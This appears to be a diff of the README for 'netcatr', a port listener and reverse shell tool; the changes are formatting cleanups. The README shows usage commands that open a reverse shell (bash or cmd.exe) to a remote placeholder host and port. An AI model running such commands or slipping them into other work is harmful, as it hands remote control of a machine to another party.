@@ -1,16 +1,15 @@
 # 📡 netcatr
 
 ```text
-              _                 _         
- _ __    ___ | |_   ___   __ _ | |_  _ __ 
+              _                 _
+ _ __    ___ | |_   ___   __ _ | |_  _ __
 | '_ \  / _ \| __| / __| / _` || __|| '__|
-| | | ||  __/| |_ | (__ | (_| || |_ | |   
-|_| |_| \___| \__| \___| \__,_| \__||_|   
-                                          
+| | | ||  __/| |_ | (__ | (_| || |_ | |
+|_| |_| \___| \__| \___| \__,_| \__||_|
+
 ```
 
-📡 netcatr netcatr: A cross-platform port listener and reverse shell application designed for ease of use, providing seamless network connectivity.
-
+📡 netcatr: A cross-platform port listener and reverse shell application designed for ease of use, providing seamless network connectivity.
 
 ## ✨ Features
 
@@ -19,8 +18,8 @@
 - Colors;
 - Everything easy;
 
+### Modes
 
-## Modes
 - Listen mode (listen);
 - Reverse shell mode (connect);
 
@@ -51,11 +50,13 @@ netcatr listen -ib 55600
 ```
 
 and to connect:
+
 ```bash
 netcatr connect -s bash the.0.0.ip 55600
 ```
 
 Reverse shell from Windows:
+
 ```bash
 netcatr connect -s cmd.exe the.0.0.ip 55600
 ```
